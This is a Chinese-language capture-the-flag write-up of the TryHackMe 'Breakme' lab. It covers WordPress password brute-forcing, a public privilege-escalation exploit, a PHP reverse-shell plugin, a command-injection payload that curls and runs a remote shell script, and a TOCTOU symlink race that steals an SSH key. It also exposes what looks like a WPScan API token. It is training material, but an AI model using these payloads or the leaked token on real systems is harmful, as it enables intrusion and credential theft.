{"pageProps":{"postData":{"id":"TryHackMeBreakme","contentHtml":"<h1>Breakme</h1>\n<blockquote>\n<p><a href=\"https://tryhackme.com/room/breakmenu\">https://tryhackme.com/room/breakmenu</a> | medium（个人觉得 hard） | Break this secure system and get the flags, if you can.</p>\n</blockquote>\n<p>Infomation：We think our system is secure, hack it and prove us wrong.</p>\n<p><strong>Note:</strong> Please allow 3-5 minutes for the VM to fully start.</p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Breakme nmap -sT -min-rate 5000 -p- 10.10.136.4             \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-27 21:04 EDT\nWarning: 10.10.136.4 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.136.4\nHost is up (0.23s latency).\nNot shown: 64999 closed tcp ports (conn-refused), 534 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 34.94 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Breakme nmap -sT -A -T4 -O -p 22,80 10.10.136.4  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-27 21:10 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.136.4\nHost is up (0.24s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA)\n|   256 a3:9c:66:73:<span class=\"hljs-built_in\">fc</span>:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA)\n|_  256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519)\n80/tcp open  http    Apache httpd 2.4.56 ((Debian))\n|_http-server-header: Apache/2.4.56 (Debian)\n|_http-title: Apache2 Debian Default Page: It works\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Asus RT-N10 router or AXIS 211A Network Camera (Linux 2.6) (90%), Linux 2.6.18 (90%), AXIS 211A Network Camera (Linux 2.6.20) (90%), Linux 2.6.16 (90%), Crestron MPC-M5 AV controller or Wago Kontakttechnik 750-852 PLC (87%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   236.56 ms 10.21.0.1\n2   236.58 ms 10.10.136.4\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 24.02 seconds\n</code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p>访问主页，默认页面</p>\n<p><img src=\"/post-images/TryHackMeBreakme/image.png\" alt=\"image.png\"></p>\n<p>目录扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Breakme dirsearch -u http://10.10.136.4 -x 403,404,429 -e php,zip,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/Breakme/reports/http_10.10.136.4/_25-05-27_21-16-24.txt\n\nTarget: http://10.10.136.4/\n\n[21:16:24] Starting: \n[21:17:41] 301 -  311B  - /manual  ->  http://10.10.136.4/manual/\n[21:17:41] 200 -  208B  - /manual/index.html\n[21:18:23] 200 -    2KB - /wordpress/wp-login.php\n[21:18:24] 200 -   14KB - /wordpress/\n</code></pre>\n<p>目录扫描出<code>wordpress</code> ，直接上 <code>WPScan</code></p>\n<pre><code class=\"hljs language-bash\">➜  Breakme wpscan --url 10.10.136.4/wordpress --api-token bOauzGNYvhy6BU3DlHGCMVZmWJDqZH5tuFoHfsdk91o -e u,ap\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` |  _ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://10.10.136.4/wordpress/ [10.10.136.4]\n[+] Started: Tue May 27 21:26:09 2025\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.56 (Debian)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.136.4/wordpress/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n  | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://10.10.136.4/wordpress/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://10.10.136.4/wordpress/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).\n | Found By: Rss Generator (Passive Detection)\n |  - http://10.10.136.4/wordpress/index.php/feed/, &#x3C;generator>https://wordpress.org/?v=6.4.3&#x3C;/generator>\n |  - http://10.10.136.4/wordpress/index.php/comments/feed/, &#x3C;generator>https://wordpress.org/?v=6.4.3&#x3C;/generator>\n |\n | [!] 4 vulnerabilities identified:\n |\n | [!] Title: WP &#x3C; 6.5.2 - Unauthenticated Stored XSS\n |     Fixed <span class=\"hljs-keyword\">in</span>: 6.4.4\n |     References:\n |      - https://wpscan.com/vulnerability/1a5c5df1-57ee-4190-a336-b0266962078f\n |      - https://wordpress.org/news/2024/04/wordpress-6-5-2-maintenance-and-security-release/\n |\n | [!] Title: WordPress &#x3C; 6.5.5 - Contributor+ Stored XSS <span class=\"hljs-keyword\">in</span> HTML API\n |     Fixed <span class=\"hljs-keyword\">in</span>: 6.4.5\n |     References:\n |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28\n |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/\n |\n | [!] Title: WordPress &#x3C; 6.5.5 - Contributor+ Stored XSS <span class=\"hljs-keyword\">in</span> Template-Part Block\n |     Fixed <span class=\"hljs-keyword\">in</span>: 6.4.5\n |     References:\n |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c\n |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/\n\n[+] WordPress theme <span class=\"hljs-keyword\">in</span> use: twentytwentyfour\n | Location: http://10.10.136.4/wordpress/wp-content/themes/twentytwentyfour/\n | Last Updated: 2024-11-13T00:00:00.000Z\n | Readme: http://10.10.136.4/wordpress/wp-content/themes/twentytwentyfour/readme.txt\n | [!] The version is out of <span class=\"hljs-built_in\">date</span>, the latest version is 1.3\n | Style URL: http://10.10.136.4/wordpress/wp-content/themes/twentytwentyfour/style.css\n | Style Name: Twenty Twenty-Four\n | Style URI: https://wordpress.org/themes/twentytwentyfour/\n | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...\n | Author: the WordPress team\n | Author URI: https://wordpress.org\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | Version: 1.0 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://10.10.136.4/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: <span class=\"hljs-string\">'Version: 1.0'</span>\n\n[+] Enumerating All Plugins (via Passive Methods)\n[+] Checking Plugin Versions (via Passive and Aggressive Methods)\n\n[i] Plugin(s) Identified:\n\n[+] wp-data-access\n | Location: http://10.10.136.4/wordpress/wp-content/plugins/wp-data-access/\n | Last Updated: 2025-05-23T00:05:00.000Z\n | [!] The version is out of <span class=\"hljs-built_in\">date</span>, the latest version is 5.5.41\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | [!] 5 vulnerabilities identified:\n |\n | [!] Title: WP Data Access &#x3C; 5.3.8 - Subscriber+ Privilege Escalation\n |     Fixed <span class=\"hljs-keyword\">in</span>: 5.3.8\n |     References:\n |      - https://wpscan.com/vulnerability/7871b890-5172-40aa-88f2-a1b95e240ad4\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1874\n |      - https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/\n |\n | [!] Title: Freemius SDK &#x3C; 2.5.10 - Reflected Cross-Site Scripting\n |     Fixed <span class=\"hljs-keyword\">in</span>: 5.3.11\n |     References:\n |      - https://wpscan.com/vulnerability/39d1f22f-ea34-4d94-9dc2-12661cf69d36\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33999\n |\n | [!] Title: WP Data Access &#x3C; 5.5.9 - Cross-Site Request Forgery\n |     Fixed <span class=\"hljs-keyword\">in</span>: 5.5.9\n |     References:\n |      - https://wpscan.com/vulnerability/4fe0d330-6511-4500-ac3f-b9bb944b8f0e\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-43295\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/85a33508-71f2-4aa1-8d51-667eb0690fbd\n |\n | [!] Title: WP Data Access – App, Table, Form and Chart Builder plugin &#x3C; 5.5.23 - Unauthenticated SQL Injection\n |     Fixed <span class=\"hljs-keyword\">in</span>: 5.5.23\n |     References:\n |      - https://wpscan.com/vulnerability/2c35b255-9f6b-47c2-b3be-56e49b9a9961\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12428\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a1708d6e-14f5-418f-81eb-f9269159b5b1\n |\n | [!] Title: WP Data Access &#x3C; 5.5.37 - Authenticated (Contributor+) Stored Cross-Site Scripting\n |     Fixed <span class=\"hljs-keyword\">in</span>: 5.5.37\n |     References:\n |      - https://wpscan.com/vulnerability/6a48d064-a325-42b1-a5fa-024f39bbef22\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-39582\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e8260829-49a6-4ec0-8771-25d1cce8cc8c\n |\n | Version: 5.3.5 (80% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://10.10.136.4/wordpress/wp-content/plugins/wp-data-access/readme.txt\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:02 &#x3C;==================================================================================================================================> (10 / 10) 100.00% Time: 00:00:02\n\n[i] User(s) Identified:\n\n[+] admin\n | Found By: Author Posts - Author Pattern (Passive Detection)\n | Confirmed By:\n |  Rss Generator (Passive Detection)\n |  Wp Json Api (Aggressive Detection)\n |   - http://10.10.136.4/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&#x26;page=1\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[+] bob\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] WPScan DB API OK\n | Plan: free\n | Requests Done (during the scan): 1\n | Requests Remaining: 22\n</code></pre>\n<p>扫描出来一个权限提升漏洞 <code>CVE-2023-1874</code> ，并且枚举出来两个用户：<code>admin</code>，<code>bob</code></p>\n<h3>CVE-2023-1874 &#x26; 反弹 shell</h3>\n<p>那么应该是要找到 <code>bob</code> 的凭据，然后使用权限提升漏洞提权至 <code>admin</code></p>\n<p>这里枚举 <code>bob</code> 用户密码</p>\n<pre><code class=\"hljs language-bash\">➜  Breakme wpscan --url 10.10.136.4/wordpress --api-token bOauzGNYvhy6BU3DlHGCMVZmWJDqZH5tuFoHfsdk91o -U bob -P /usr/share/wordlists/rockyou.txt\n...\n[!] Valid Combinations Found:\n | Username: bob, Password: soccer\n</code></pre>\n<p>得到密码 <code>soccer</code> ，并以<code>bob</code>用户成功进入后台</p>\n<p><img src=\"/post-images/TryHackMeBreakme/image1.png\" alt=\"image.png\"></p>\n<p>可以看到并没有什么功能，只是一个普通用户</p>\n<p>尝试利用 <code>CVE-2023-1874</code> ，Payload：<a href=\"https://github.com/thomas-osgood/cve-2023-1874\">https://github.com/thomas-osgood/cve-2023-1874</a></p>\n<pre><code class=\"hljs language-bash\">➜  cve-2023-1874 git:(main) python cve20231874.py 10.10.154.120 80 -u bob -p soccer --path wordpress\n============================================================\n                     Target Information                     \n============================================================\n[i] Target IP: 10.10.154.120\n[i] Target Port: 80\n[i] Scheme: http\n============================================================\n[+] cookies <span class=\"hljs-built_in\">set</span>\n[+] login success\n[+] profile <span class=\"hljs-built_in\">source</span> successfully grabbed\n[+] wpnonce: 80c6001c60\n[+] userid: 2\n[+] from: profile\n[+] color-nonce: 38749c8133\n[+] admin privileges successfully granted to <span class=\"hljs-string\">\"bob\"</span>\n[+] exploit completed succesfully\n</code></pre>\n<p>利用完成后可以看到 <code>bob</code> 用户是管理员权限了</p>\n<p><img src=\"/post-images/TryHackMeBreakme/image2.png\" alt=\"image.png\"></p>\n<p>进行反弹<code>shell</code> ，这里可以在插件功能中实现</p>\n<p>创建 <code>reverse.php</code></p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php\n/**\n * Plugin Name: Reverse Shell Plugin\n * Plugin URI: \n * Description: Reverse Shell Plugin <span class=\"hljs-keyword\">for</span> penetration testing.\n * Version: 1.0\n * Author: Security Analyst\n * Author URI: http://www.example.com\n */\n<span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/10.21.192.44/1234 0>&#x26;1'\"</span>);\n?>\n</code></pre>\n<p>进行压缩</p>\n<pre><code class=\"hljs language-bash\">➜  Breakme zip reverse.zip reverse.php \n  adding: reverse.php (deflated 28%)\n</code></pre>\n<p>上传到 <code>wordpress</code> 插件并启用</p>\n<p><img src=\"/post-images/TryHackMeBreakme/image3.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/TryHackMeBreakme/image4.png\" alt=\"image.png\"></p>\n<p>就能接收到弹过来的 <code>shell</code> 了</p>\n<p><img src=\"/post-images/TryHackMeBreakme/image5.png\" alt=\"image.png\"></p>\n<h2>提权 - To John</h2>\n<pre><code class=\"hljs language-bash\">/** Database username */\ndefine( <span class=\"hljs-string\">'DB_USER'</span>, <span class=\"hljs-string\">'econor'</span> );                                                                          \n                                                                                                        \n/** Database password */\ndefine( <span class=\"hljs-string\">'DB_PASSWORD'</span>, <span class=\"hljs-string\">'SuP3rS3cR37#DB#P@55wd'</span> );\n\n/** Database hostname */\ndefine( <span class=\"hljs-string\">'DB_HOST'</span>, <span class=\"hljs-string\">'localhost'</span> );           \n                                                    \n/** Database charset to use <span class=\"hljs-keyword\">in</span> creating database tables. */                \ndefine( <span class=\"hljs-string\">'DB_CHARSET'</span>, <span class=\"hljs-string\">'utf8mb4'</span> );                                                                      \n                                                    \n/** The database collate <span class=\"hljs-built_in\">type</span>. Don<span class=\"hljs-string\">'t change this if in doubt. */\ndefine( '</span>DB_COLLATE<span class=\"hljs-string\">', '</span><span class=\"hljs-string\">' );  \n</span></code></pre>\n<pre><code class=\"hljs language-bash\">MariaDB [wpdatabase]> <span class=\"hljs-keyword\">select</span> * from wp_users;\n+----+------------+------------------------------------+---------------+---------------------+------------------------------+---------------------+---------------------+-------------+--------------+\n| ID | user_login | user_pass                          | user_nicename | user_email          | user_url                     | user_registered     | user_activation_key | user_status | display_name |\n+----+------------+------------------------------------+---------------+---------------------+------------------------------+---------------------+---------------------+-------------+--------------+\n|  1 | admin      | $P<span class=\"hljs-variable\">$BlnXZ2omtPVcOotjXqtdQrN</span>.IS0tqU. | admin         | admin@localhost.com | http://192.168.1.6/wordpress | 2023-08-09 20:49:44 |                     |           0 | admin        |\n|  2 | bob        | $P<span class=\"hljs-variable\">$BoS2</span>/2/DSJmMKVl1FNf5nMivAGk7lC1 | bob           | bob@localhost.com   |                              | 2023-08-09 20:55:29 |                     |           0 | bob bob      |\n+----+------------+------------------------------------+---------------+---------------------+------------------------------+---------------------+---------------------+-------------+--------------+\n2 rows <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.000 sec)\n</code></pre>\n<p>发现内部服务开启在 <code>9999</code> 端口</p>\n<pre><code class=\"hljs language-bash\">www-data@Breakme:/$ ss -tulpn\nNetid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process  \nudp    UNCONN  0       0              0.0.0.0:68          0.0.0.0:*             \ntcp    LISTEN  0       80           127.0.0.1:3306        0.0.0.0:*             \ntcp    LISTEN  0       4096         127.0.0.1:9999        0.0.0.0:*             \ntcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*             \ntcp    LISTEN  0       511                  *:80                *:*             \ntcp    LISTEN  0       128               [::]:22             [::]:*  \n</code></pre>\n<p>上传<code>socat</code> 转发出去</p>\n<pre><code class=\"hljs language-bash\">www-data@Breakme:/tmp$ ./socat TCP-LISTEN:9998,fork tcp4:127.0.0.1:9999 &#x26;\n[1] 1161\n</code></pre>\n<p>访问，貌似实现了几个功能</p>\n<p><img src=\"/post-images/TryHackMeBreakme/image6.png\" alt=\"image.png\"></p>\n<p>上传 <code>pspy64</code> 监听一下进程，然后使用工具</p>\n<pre><code class=\"hljs language-bash\">// chack Target\n2025/05/28 04:29:36 CMD: UID=1002  PID=1211   | sh -c ping -c 2 10.21.192.44 >/dev/null 2>&#x26;1 &#x26;\n// check User\n2025/05/28 04:28:37 CMD: UID=1002  PID=1208   | sh -c <span class=\"hljs-built_in\">id</span> john >/dev/null 2>&#x26;1 &#x26;\n// check File\n2025/05/28 04:30:42 CMD: UID=1002  PID=1215   | sh -c find /opt -name <span class=\"hljs-string\">\"passwd\"</span> 2>/dev/null\n</code></pre>\n<p>可能会存在命令注入，这里使用 <code>Check User</code> 来测试（最简洁）</p>\n<pre><code class=\"hljs language-bash\">john|<span class=\"hljs-built_in\">touch</span> /tmp/1|\n//\n2025/05/28 04:40:32 CMD: UID=1002  PID=1311   | sh -c <span class=\"hljs-built_in\">id</span> john|<span class=\"hljs-built_in\">touch</span>/tmp/1| >/dev/null 2>&#x26;1 &#x26; \n</code></pre>\n<p>空格被过滤了，但是<code>|</code>并没有被过滤，我们尝试绕过空格</p>\n<p><img src=\"/post-images/TryHackMeBreakme/image7.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">john|curl<span class=\"hljs-variable\">${IFS}</span>10.21.192.44|\n</code></pre>\n<p><img src=\"/post-images/TryHackMeBreakme/image8.png\" alt=\"image.png\"></p>\n<p>可以通过 <code>${IFS}</code> 绕过空格，我们进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">// shell.sh\nbash -i >&#x26; /dev/tcp/10.21.192.44/1234 0>&#x26;1\n</code></pre>\n<pre><code class=\"hljs language-bash\">john|curl<span class=\"hljs-variable\">${IFS}</span>10.21.192.44/shell.sh|bash|\n</code></pre>\n<p>接收到 <code>john</code> 的 <code>shell</code></p>\n<p><img src=\"/post-images/TryHackMeBreakme/image9.png\" alt=\"image.png\"></p>\n<p>得到 <code>user1.txt</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> user1.txt\n5c3ea0d312568c7ac68d213785b26677\n</code></pre>\n<h2>提权 - To Youcef</h2>\n<p>执行 <code>/home/youcef/readfile</code> 以 <code>youcef</code> 权限运行</p>\n<pre><code class=\"hljs language-bash\">john@Breakme:~$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f 2>/dev/null\n/home/youcef/readfile\n</code></pre>\n<pre><code class=\"hljs language-bash\">john@Breakme:/home/youcef$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 52\ndrwxr-x--- 4 youcef john    4096 Aug  3  2023 .\ndrwxr-xr-x 5 root   root    4096 Feb  3  2024 ..\nlrwxrwxrwx 1 youcef youcef     9 Aug  3  2023 .bash_history -> /dev/null\n-rw-r--r-- 1 youcef youcef   220 Aug  1  2023 .bash_logout\n-rw-r--r-- 1 youcef youcef  3526 Aug  1  2023 .bashrc\ndrwxr-xr-x 3 youcef youcef  4096 Aug  1  2023 .<span class=\"hljs-built_in\">local</span>\n-rw-r--r-- 1 youcef youcef   807 Aug  1  2023 .profile\n-rwsr-sr-x 1 youcef youcef 17176 Aug  2  2023 readfile\n-rw------- 1 youcef youcef  1026 Aug  2  2023 readfile.c\ndrwx------ 2 youcef youcef  4096 Aug  5  2023 .ssh\n</code></pre>\n<p>我们尝试时使用<code>readfile</code>读<code>readfile.c</code></p>\n<pre><code class=\"hljs language-bash\">john@Breakme:/home/youcef$ ./readfile readfile.c \nNice try!\n</code></pre>\n<p>… 想读私钥但是不知道命名，我们将 <code>readfile</code> 拉出来逆向</p>\n<pre><code class=\"hljs language-bash\">int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  struct <span class=\"hljs-built_in\">stat</span> stat_buf; // [rsp+20h] [rbp-4B0h] BYREF\n  char buf[1024]; // [rsp+B0h] [rbp-420h] BYREF\n  int v6; // [rsp+4B0h] [rbp-20h]\n  int fd; // [rsp+4B4h] [rbp-1Ch]\n  unsigned __int64 v8; // [rsp+4B8h] [rbp-18h]\n  char *v9; // [rsp+4C0h] [rbp-10h]\n  char *v10; // [rsp+4C8h] [rbp-8h]\n\n  <span class=\"hljs-keyword\">if</span> ( argc == 2 )\n  {\n    <span class=\"hljs-keyword\">if</span> ( access(argv[1], 0) )\n    {\n      puts(<span class=\"hljs-string\">\"File Not Found\"</span>);\n      <span class=\"hljs-built_in\">return</span> 1;\n    }\n    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> ( getuid() == 1002 )\n    {\n      v10 = strstr(argv[1], <span class=\"hljs-string\">\"flag\"</span>);\n      v9 = strstr(argv[1], <span class=\"hljs-string\">\"id_rsa\"</span>);\n      lstat((char *)argv[<span class=\"hljs-number\">1</span>], &#x26;stat_buf);\n      HIDWORD(v8) = (stat_buf.st_mode &#x26; <span class=\"hljs-number\">0</span>xF000) == <span class=\"hljs-number\">40960</span>;\n      LODWORD(v8) = access(argv[<span class=\"hljs-number\">1</span>], <span class=\"hljs-number\">4</span>);\n      usleep(<span class=\"hljs-number\">0</span>);\n      if ( v10 || v8 >= <span class=\"hljs-number\">0</span>xFFFFFFFF || v9 )\n      {\n        puts(\"Nice try!\");\n        return <span class=\"hljs-number\">1</span>;\n      }\n      else\n      {\n        puts(\"I guess you won!\\n\");\n        fd = open(argv[<span class=\"hljs-number\">1</span>], <span class=\"hljs-number\">0</span>);\n        if ( fd &#x3C; <span class=\"hljs-number\">0</span> )\n          __assert_fail(\"fd >= <span class=\"hljs-number\">0</span> &#x26;&#x26; \\\"Failed to open the file\\\"\", \"readfile.c\", <span class=\"hljs-number\">0</span>x26u, \"main\");\n        do\n          v6 = read(fd, buf, <span class=\"hljs-number\">0</span>x400uLL);\n        while ( v6 > <span class=\"hljs-number\">0</span> &#x26;&#x26; write(<span class=\"hljs-number\">1</span>, buf, v6) > <span class=\"hljs-number\">0</span> );\n        return <span class=\"hljs-number\">0</span>;\n      }\n    }\n    else\n    {\n      puts(\"You can't run this program\");\n      return <span class=\"hljs-number\">1</span>;\n    }\n  }\n  else\n  {\n    puts(\"Usage: ./readfile &#x3C;FILE>\");\n    return <span class=\"hljs-number\">1</span>;\n  }\n}\n</code></pre>\n<ol>\n<li>\n<p><strong>参数验证</strong>。这是典型的命令行参数合法性校验，确保用户正确输入文件路径。</p>\n<p>程序首先检查命令行参数是否为2（即<code>./readfile &#x3C;FILE></code>格式），否则提示用法并退出</p>\n</li>\n<li>\n<p><strong>文件存在性检查</strong>。</p>\n<p>通过<code>access(argv[1], 0)</code>验证文件是否存在，若不存在则输出\"File Not Found\"并终止。此处使用<code>access</code>系统调用实现快速检查</p>\n</li>\n<li>\n<p><strong>权限控制</strong>。</p>\n<p>程序通过<code>getuid() == 1002</code>限制只有UID为1002的用户才能执行后续操作，否则提示无权运行。这属于基于用户身份的访问控制（RBAC）</p>\n</li>\n<li>\n<p><strong>敏感文件过滤</strong>。</p>\n<p>使用<code>strstr</code>检测文件名是否包含\"flag\"或\"id_rsa\"字符串。若存在，则拒绝读取（输出\"Nice try!\"）。这是防止用户访问敏感文件的常见防护措施</p>\n</li>\n<li>\n<p><strong>文件类型与权限校验</strong></p>\n<ul>\n<li>通过 <code>lstat</code> 获取文件元数据，检查文件类型是否为符号链接（ <code>stat_buf.st_mode &#x26; 0xF000 == 40960</code> 对应 <code>S_IFLNK</code> 宏），避免符号链接攻击。</li>\n<li>使用 <code>access(argv[1], 4)</code> 验证文件是否可读（R_OK权限）。若不可读或为符号链接，则拒绝访问。</li>\n</ul>\n</li>\n<li>\n<p><strong>文件读取与输出</strong>。</p>\n<p>当通过所有安全检查后，程序以只读模式打开文件（<code>open(argv[1], 0)</code>），循环读取1024字节缓冲区并输出到标准输出，直至文件内容全部读取完毕</p>\n</li>\n</ol>\n<p>未处理竞态条件（<code>TOCTOU</code>攻击），在 <code>access</code> 与 <code>open</code> 之间可能被恶意替换文件</p>\n<p>而一种常见的起因就是代码先检查某个前置条件（例如认证），然后基于这个前置条件进行某项操作，但是在检查和操作的时间间隔内条件却可能被改变，如果代码的操作与安全相关，那么就很可能产生漏洞。这种安全问题也被称做 <code>TOCTTOU</code>（<em>time of check</em> and the <em>time of use</em>）。</p>\n<p>存在未处理的<strong>TOCTOU竞态条件漏洞</strong>，具体出现在以下代码段:</p>\n<pre><code class=\"hljs language-bash\">LODWORD(v8) = access(argv[1], 4);  // 检查文件可读性（TOCTOU的Check阶段）\nusleep(0);                         // 潜在的时间窗口\n// ... 其他逻辑 ...\nfd = open(argv[1], 0);             // 实际打开文件（TOCTOU的Use阶段）\n</code></pre>\n<p><code>access()</code>函数用于检查文件是否可读（<code>R_OK</code>），但后续的<code>open()</code>才是真正操作文件的系统调用。两者之间的时间窗口允许攻击者通过符号链接替换文件。</p>\n<ul>\n<li>攻击者在<code>access()</code>通过后立即将<code>/tmp/XYZ</code>替换为指向<code>/etc/shadow</code>的符号链接</li>\n<li><code>open()</code>实际打开的是被替换的符号链接文件，导致越权读取敏感数据</li>\n</ul>\n<p>这里查看了 <code>WP</code> : <a href=\"https://0xb0b.gitbook.io/writeups/tryhackme/2024/breakme#exploitation\">https://0xb0b.gitbook.io/writeups/tryhackme/2024/breakme#exploitation</a> | <a href=\"https://jaxafed.github.io/posts/tryhackme-breakme/#shell-as-youcef\">https://jaxafed.github.io/posts/tryhackme-breakme/#shell-as-youcef</a></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">while</span> <span class=\"hljs-literal\">true</span>; <span class=\"hljs-keyword\">do</span> <span class=\"hljs-built_in\">touch</span> file; <span class=\"hljs-built_in\">sleep</span> 0.3; <span class=\"hljs-built_in\">ln</span> -sf /home/youcef/.ssh/id_rsa file; <span class=\"hljs-built_in\">sleep</span> 0.3; <span class=\"hljs-built_in\">rm</span> file; <span class=\"hljs-keyword\">done</span> &#x26;\n</code></pre>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">while</span> <span class=\"hljs-literal\">true</span>; <span class=\"hljs-keyword\">do</span> out=$(/home/youcef/readfile file | grep -Ev <span class=\"hljs-string\">'Found|guess'</span>| grep .);<span class=\"hljs-keyword\">if</span> [[ -n <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$out</span>\"</span> ]]; <span class=\"hljs-keyword\">then</span> <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$out</span>\"</span>; <span class=\"hljs-built_in\">break</span>; <span class=\"hljs-keyword\">fi</span>; <span class=\"hljs-keyword\">done</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">-----BEGIN OPENSSH PRIVATE 